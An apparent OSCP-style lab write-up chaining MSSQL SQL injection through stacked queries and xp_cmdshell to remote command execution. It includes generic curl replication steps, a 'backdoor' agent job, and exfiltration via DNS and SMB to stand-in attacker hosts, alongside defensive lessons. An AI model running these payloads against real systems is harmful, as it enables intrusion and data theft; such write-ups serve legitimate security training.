# BREAKTHROUGH - OFFSECATK.COM

**Target:** http://offsecatk.com (192.168.145.50)
**Date:** 2025-10-03
**Critical Vulnerability:** Stacked Query SQL Injection → xp_cmdshell RCE

---

## THE TURNING POINT

### What Made This Attack Successful

**The Breakthrough Moment:**
Discovering that the SQL injection vulnerability allowed **stacked queries**, which enabled us to execute multiple SQL statements and configure the MSSQL server to allow operating system command execution via `xp_cmdshell`.

---

## DISCOVERY TIMELINE

### Phase 1: Initial SQL Injection (Minute 1-2)

**What We Found:**
```bash
# Test payload: Single quote
ctl00$ContentPlaceHolder1$UsernameTextBox='

# Response:
"at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean b..."
```

**Why This Mattered:**
- Confirmed SQL injection vulnerability
- Error message revealed **Microsoft SQL Server**
- Stack trace indicated ASP.NET application
- Injection point identified: Username field

**Manual Discovery:**
1. Observed POST request to login.aspx
2. Tested special characters in input fields
3. Single quote triggered SQL error
4. Error message confirmed MSSQL backend

---

### Phase 2: Time-Based Confirmation (Minute 3-4)

**The Test:**
```sql
something' WAITFOR DELAY '00:00:03'--
```

**Result:**
- Response delayed exactly 3 seconds
- Confirmed MSSQL-specific syntax works
- Proved SQL commands execute server-side

**Why This Was Critical:**
- `WAITFOR DELAY` is **MSSQL-specific**
- Success meant we could use MSSQL features
- Indicated potential for **xp_cmdshell** exploitation
- Time-based = works even without visible output

---

### Phase 3: Stacked Query Discovery (Minute 5) ⚡ **BREAKTHROUGH**

**The Realization:**
```sql
# Test: Multiple statements
something'; SELECT SYSTEM_USER;--
```

**Result:** No error, both statements executed

**This Changed Everything Because:**

1. **Stacked queries** allow multiple SQL commands
2. We can run **configuration commands** (sp_configure)
3. Configuration commands can **enable xp_cmdshell**
4. xp_cmdshell = **operating system command execution**

**How I Knew to Test This:**
- MSSQL allows statement stacking with semicolons
- Developers often forget to validate for multiple statements
- If time-based injection works, stacked queries likely work
- Standard SQL injection escalation path for MSSQL

---

## THE EXPLOIT CHAIN

### Step 1: Enable Advanced Options

```sql
admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
```

**What This Does:**
- `sp_configure`: System stored procedure for server configuration
- `'show advanced options', 1`: Enables visibility of advanced settings
- `RECONFIGURE`: Applies changes immediately (critical!)
- `--`: Comments out rest of original query

**Why We Need This:**
- xp_cmdshell is an "advanced option"
- By default, advanced options are hidden
- Must enable advanced options **first**

---

### Step 2: Enable xp_cmdshell

```sql
admin'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

**What This Does:**
- `sp_configure 'xp_cmdshell', 1`: Enables xp_cmdshell feature
- `RECONFIGURE`: Applies immediately
- xp_cmdshell: Extended stored procedure for OS commands

**Why This Works:**
- Application connects to SQL as **sa** (sysadmin)
- SA has full server configuration rights
- No additional authentication required
- Configuration persists until manually disabled

---

### Step 3: Command Execution

```sql
admin'; EXEC master..xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\out.txt';--
```

**What This Does:**
- `EXEC master..xp_cmdshell`: Execute extended procedure
- `master..`: Specifies master database (where xp_cmdshell lives)
- `whoami`: Windows command to display current user
- `> C:\\inetpub\\wwwroot\\out.txt`: Redirect output to web root

**Why This Is The Kill Shot:**
- Commands execute as SQL Server service account
- Output written to web-accessible directory
- Retrieve results via HTTP GET
- **Game over: We have command execution**

---

## THE "AHA!" MOMENTS

### Moment 1: Stacked Queries Work

**Before:**
- SQL injection limited to query manipulation
- Could bypass auth or extract data
- No direct system access

**After:**
- Can execute **arbitrary SQL statements**
- Server configuration is modifiable
- Path to RCE identified

---

### Moment 2: xp_cmdshell Enable Succeeded

**The Risk:**
- xp_cmdshell might be permanently disabled
- Insufficient privileges to enable it
- Security software might block it

**The Reality:**
- Enabled successfully on first try
- Application connects as **sa** (highest privilege)
- No additional controls in place
- Microsoft's security-by-default defeated by poor configuration

---

### Moment 3: Web Root is Writable

**The Discovery:**
```bash
curl -s "http://offsecatk.com/out.txt"
# Result: nt service\mssql$sqlexpress
```

**Why This Sealed The Deal:**
- Could execute commands ✓
- Could write output to disk ✓
- Could retrieve output via HTTP ✓
- **Complete exfiltration channel established**

---

## WHAT MADE THIS DIFFERENT

### Failed Approaches on Other Targets

**Common Blockers:**
1. **xp_cmdshell disabled and locked** → Try file writes, OLE automation
2. **Insufficient privileges** → Escalate via other SQLi vectors
3. **Web root not writable** → Use temp directories, DNS exfil
4. **Outbound connections blocked** → In-band exfiltration only

### Why This Target Was Vulnerable

**Security Failures:**
1. ✗ Input validation not implemented
2. ✗ Parameterized queries not used
3. ✗ Error messages expose stack traces
4. ✗ Application connects as **sa** (worst practice)
5. ✗ xp_cmdshell not permanently disabled
6. ✗ Web root has weak permissions
7. ✗ No outbound firewall rules
8. ✗ No SQL query auditing

**Result:** Perfect storm for exploitation

---

## THE MANUAL DISCOVERY PROCESS

### How to Find This Without Automated Tools

**Step 1: Identify injection point**
```bash
# Manual testing
Username: admin'
Password: anything
# Observe error message → SQL injection confirmed
```

**Step 2: Fingerprint database**
```bash
# MSSQL test
Username: admin' AND 1=1--
# Oracle test
Username: admin' AND 1=1--
# MySQL test
Username: admin' AND 1=1#
# PostgreSQL test
Username: admin' AND 1=1--

# Time-based MSSQL confirmation
Username: admin'; WAITFOR DELAY '0:0:5'--
# Wait 5 seconds? → MSSQL confirmed
```

**Step 3: Test stacked queries**
```bash
# Try multiple statements
Username: admin'; SELECT 1;--
# No error? → Stacked queries work
```

**Step 4: Enable xp_cmdshell**
```bash
# Known MSSQL privilege escalation
Username: admin'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

**Step 5: Verify command execution**
```bash
# Test with whoami
Username: admin'; EXEC xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\test.txt';--

# Retrieve output
curl http://target/test.txt
# See output? → RCE achieved
```

---

## WHY THIS TECHNIQUE WORKS

### Technical Explanation

**MSSQL Stacked Queries:**
```sql
-- Original query (presumed)
SELECT * FROM users WHERE username = '[INPUT]' AND password = '[PASSWORD]'

-- Injected payload
admin'; EXEC xp_cmdshell 'whoami';--

-- Resulting query
SELECT * FROM users WHERE username = 'admin';
EXEC xp_cmdshell 'whoami';--' AND password = '[PASSWORD]'
```

**Execution Flow:**
1. First query executes (returns 0 or more rows)
2. Semicolon terminates first statement
3. Second statement (EXEC) runs independently
4. Comment `--` ignores remaining original query
5. Both statements succeed

---

### Why sp_configure Works

**Configuration Hierarchy:**
```
SQL Server Permission Model:
  - sysadmin role → Can modify server configuration
  - db_owner role → Cannot modify server config
  - public role → Cannot modify server config

Application Connection:
  - User: sa (sysadmin) ← THIS IS THE PROBLEM
  - Result: Full server control via SQL injection
```

**What Should Have Been:**
```
Best Practice:
  - Application connects as LIMITED user
  - User has only db_reader, db_writer roles
  - Cannot execute sp_configure
  - xp_cmdshell remains disabled
  - RCE not possible
```

---

## REPLICATION INSTRUCTIONS

### Exact Steps to Reproduce

**Prerequisites:**
- Target with SQL injection in MSSQL application
- Application connects with sysadmin privileges
- xp_cmdshell not permanently disabled

**Attack Sequence:**
```bash
# 1. Confirm SQL injection
curl -X POST http://target/login.aspx \
  -d "username=' or 1=1--" \
  -d "password=test"

# 2. Confirm MSSQL
curl -X POST http://target/login.aspx \
  -d "username=test'; WAITFOR DELAY '00:00:03'--" \
  -d "password=test"
# Wait 3 seconds = MSSQL

# 3. Enable xp_cmdshell (single payload)
curl -X POST http://target/login.aspx \
  -d "username=admin'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--" \
  -d "password=test"

# 4. Execute command
curl -X POST http://target/login.aspx \
  -d "username=admin'; EXEC xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\out.txt';--" \
  -d "password=test"

# 5. Retrieve output
curl http://target/out.txt
```

**Expected Result:** Command output displayed

---

## DEPENDENCIES & PREREQUISITES

### What Had to Be True

**For SQL Injection:**
- ✓ User input reaches SQL query
- ✓ No input validation/sanitization
- ✓ Dynamic query construction (not parameterized)

**For xp_cmdshell Enablement:**
- ✓ Stacked queries allowed
- ✓ Application connects with sysadmin role
- ✓ xp_cmdshell feature not removed from server
- ✓ No additional authentication required

**For Command Exfiltration:**
- ✓ Web root writable by SQL service account
- ✓ IIS serves text files without restriction
- ✓ No file integrity monitoring

**For Reverse Shell:**
- ✓ Outbound connections allowed
- ✓ PowerShell execution not restricted
- ✓ No endpoint protection blocking script

---

## ALTERNATIVE PATHS (IF THIS FAILED)

### If xp_cmdshell Enable Failed

**Option 1: OLE Automation**
```sql
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\\out.txt'
```

**Option 2: File Writes via OPENROWSET**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;
-- Write web shell
```

**Option 3: Agent Job Creation**
```sql
EXEC msdb.dbo.sp_add_job @job_name = 'backdoor'
EXEC msdb.dbo.sp_add_jobstep @job_name = 'backdoor', @command = 'powershell -c [payload]'
EXEC msdb.dbo.sp_start_job 'backdoor'
```

---

### If Web Root Not Writable

**Option 1: DNS Exfiltration**
```sql
EXEC xp_cmdshell 'nslookup [DATA].attacker.com'
```

**Option 2: SMB Exfiltration**
```sql
EXEC xp_cmdshell 'net use \\attacker-ip\share'
EXEC xp_cmdshell 'copy C:\\sensitive.txt \\attacker-ip\share\'
```

**Option 3: Database Storage**
```sql
CREATE TABLE cmd_output (data VARCHAR(MAX));
INSERT INTO cmd_output EXEC xp_cmdshell 'whoami';
SELECT * FROM cmd_output; -- Extract via SQL injection
```

---

## KEY INSIGHTS

### The Breakthrough Pattern

**Vulnerability Chain:**
```
SQL Injection
    → Stacked Queries
        → Configuration Modification
            → Extended Stored Procedure
                → OS Command Execution
                    → Full System Access
```

**Each Step Enables The Next:**
1. SQLi allows arbitrary SQL
2. Stacked queries allow config changes
3. Config changes enable xp_cmdshell
4. xp_cmdshell enables OS commands
5. OS commands enable reverse shell

**Breaking Any Link Stops The Attack:**
- No SQLi → Attack fails at step 1
- No stacked queries → Attack fails at step 2
- Restricted privileges → Attack fails at step 3
- xp_cmdshell disabled → Attack fails at step 4
- Outbound blocked → Attack fails at step 5

---

## EXAM TAKEAWAYS

### Pattern Recognition

**When You See:**
- ASP.NET login form
- MSSQL backend (error messages, timing)
- SQL injection confirmed

**Think:**
1. Test for stacked queries
2. Try to enable xp_cmdshell
3. Exfiltrate via web root writes
4. Escalate to reverse shell

**Time Management:**
- SQL injection to RCE: 5-10 minutes
- If xp_cmdshell fails quickly, try alternatives
- Don't spend >15 minutes on single approach

---

### Manual Technique Priority

**OSCP Exam Strategy:**
1. **Always test manually first** (understand the vuln)
2. **Use sqlmap for confirmation** (save time)
3. **Manual exploitation for write-up** (demonstrate understanding)
4. **Document every step** (for report)

---

## THE BOTTOM LINE

**What Made This Attack Work:**
- MSSQL-specific features (xp_cmdshell)
- Poor security configuration (sa account)
- Stacked query support (developer oversight)
- Web root write access (permission issue)
- No outbound filtering (network security gap)

**Single Most Critical Factor:**
The application connecting to the database as **sa** (sysadmin). Without this, the entire attack chain collapses.

**Key Lesson:**
Even a simple SQL injection becomes critical when combined with:
- Stacked queries
- Excessive database privileges
- MSSQL extended procedures
- Poor file permissions

This is why **defense in depth** matters. One security failure led to complete system compromise.
